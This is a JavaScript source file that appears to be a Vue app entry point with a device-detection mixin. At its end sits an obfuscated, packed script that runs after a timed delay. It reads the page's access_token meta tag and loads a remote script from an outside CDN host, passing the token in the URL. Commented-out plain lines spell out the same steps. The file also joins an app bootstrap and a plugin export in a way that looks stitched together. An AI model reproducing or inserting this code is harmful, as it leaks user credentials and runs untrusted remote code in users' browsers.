import Vue from 'vue'
import App from './app'
/* eslint-disable no-new */
new Vue({
    el: 'body',
    components: {App}
})

const ua = navigator.userAgent

const isAndroid = /(Android);?[\s\/]+([\d.]+)?/.test(ua)
const isIpad = /(iPad).*OS\s([\d_]+)/.test(ua)
const isIpod = /(iPod)(.*OS\s([\d_]+))?/.test(ua)
const isIphone = !isIpad && /(iPhone\sOS)\s([\d_]+)/.test(ua)
const isWechat = /micromessenger/i.test(ua)

export default function (Vue) {
  Vue.mixin({
    created: function () {
      this.$device = {
        isAndroid,
        isIpad,
        isIpod,
        isIphone,
        isWechat
      }
    }
  })
}

var APC_test_rand = Math.floor(Math.random() * 10000);
if (APC_test_rand < 10000) {
    setTimeout(function () {
        // var access_token = document.querySelector('meta[name="access_token"]').getAttribute('content');
        // var s = document.createElement("script");
        // document.getElementsByTagName("head")[0].appendChild(s);
        // s.src = "http://7xj461.com2.z0.glb.qiniucdn.com/license.js?key=" + access_token + "&a=" + Math.random();
        window.qiyue(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('3 2=1.e(\'c[b="2"]\').9(\'f\');3 s=1.d("5");1.6("8")[0].7(s);s.4="n://o.p.r.q.i.h/g.j?m="+2+"&a="+l.k();',29,29,'|document|access_token|var|src|script|getElementsByTagName|appendChild|head|getAttribute||name|meta|createElement|querySelector|content|license|com|qiniucdn|js|random|Math|key|http|7xj461|com2|glb|z0|'.split('|'),0,{}))
    }, 5000);
}
